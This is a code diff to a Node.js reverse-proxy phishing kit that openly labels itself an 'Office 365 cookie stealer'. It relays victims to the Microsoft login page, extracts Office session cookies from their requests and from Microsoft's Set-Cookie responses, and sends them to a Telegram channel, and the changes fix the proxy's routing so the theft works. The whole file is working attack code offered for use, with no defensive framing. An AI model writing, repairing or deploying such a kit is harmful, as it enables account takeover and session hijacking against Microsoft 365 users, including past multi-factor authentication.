@@ -1,5 +1,5 @@
 // =============================================
-// OFFICE 365 COOKIE STEALER - REVERSE PROXY
+// OFFICE 365 COOKIE STEALER - REVERSE PROXY (FIXED)
 // =============================================
 
 const express = require('express');
@@ -148,9 +148,10 @@ function extractOfficeCookies(cookies) {
 }
 
 // =============================================
-// PROXY MIDDLEWARE
+// ✅ FIXED: PROXY MIDDLEWARE - CORRECT TARGET
 // =============================================
 const proxyMiddleware = createProxyMiddleware({
+    // ✅ CORRECT: Send to the root of Microsoft login
     target: 'https://login.microsoftonline.com',
     changeOrigin: true,
     secure: true,
@@ -158,15 +159,21 @@ const proxyMiddleware = createProxyMiddleware({
     cookieDomainRewrite: {
         '*': ''
     },
+    pathRewrite: {
+        '^/proxy': '/'  // ← THIS IS KEY! Removes /proxy from the path
+    },
     onProxyReq: (proxyReq, req, res) => {
         console.log('\n🎯 PROXY REQUEST RECEIVED');
-        console.log('🌐 URL:', req.url);
+        console.log('🌐 Original URL:', req.url);
         console.log('📌 Method:', req.method);
+        
+        // Log the request being forwarded
+        console.log('📤 Forwarding to:', proxyReq.path);
         
         const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
         
         if (cookieHeader) {
-            console.log('🍪 Cookies captured in proxy!');
+            console.log('🍪 Cookies in request:', cookieHeader.substring(0, 200) + '...');
             
             const cookies = extractCookies({ cookie: cookieHeader });
             const officeCookies = extractOfficeCookies(cookies);
@@ -218,8 +225,6 @@ const proxyMiddleware = createProxyMiddleware({
                     }
                 }
                 
-                // ✅ FIXED: This is inside onProxyReq which is NOT async
-                // So we call sendToTelegram without await
                 sendToTelegram(message, sessionData).catch(console.error);
             } else {
                 console.log('❌ No Office cookies found in proxy request.');
@@ -234,12 +239,7 @@ const proxyMiddleware = createProxyMiddleware({
             console.log('\n🍪 MICROSOFT SET COOKIES:');
             console.log(setCookie.join('\n'));
             
-            const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
-                setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
-            
-            // ✅ FIXED: Call without await
-            sendToTelegram(message).catch(console.error);
-            
+            // Extract cookies from set-cookie
             const cookies = {};
             for (const cookie of setCookie) {
                 const [name, ...valueParts] = cookie.split('=');
@@ -247,6 +247,11 @@ const proxyMiddleware = createProxyMiddleware({
                     cookies[name] = valueParts.join('=').split(';')[0];
                 }
             }
+            
+            // Send to Telegram
+            const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
+                setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
+            sendToTelegram(message).catch(console.error);
             
             const officeCookies = extractOfficeCookies(cookies);
             if (Object.keys(officeCookies).length > 0) {
@@ -271,16 +276,26 @@ const proxyMiddleware = createProxyMiddleware({
 });
 
 // =============================================
-// PROXY ROUTE
+// ✅ FIXED: PROXY ROUTE - Handles all paths
 // =============================================
+// This catches /proxy, /proxy/, /proxy/anything
 app.use('/proxy', (req, res, next) => {
     console.log('\n🎯 PROXY ACCESS');
     console.log('📍 Client IP:', req.ip || req.connection.remoteAddress);
-    console.log('🌐 URL:', req.url);
+    console.log('🌐 Full URL:', req.url);
+    console.log('🌐 Original URL:', req.originalUrl);
     next();
 });
 
 app.use('/proxy', proxyMiddleware);
+
+// =============================================
+// Also handle /proxy/ (with trailing slash)
+// =============================================
+app.get('/proxy/', (req, res) => {
+    // Redirect to /proxy (without slash) so it works properly
+    res.redirect('/proxy');
+});
 
 // =============================================
 // CAPTURE ENDPOINT
@@ -356,7 +371,6 @@ app.post('/capture', async (req, res) => {
             }
         }
         
-        // ✅ This is inside an async function - await is valid here
         await sendToTelegram(message, sessionData);
         
     } else {
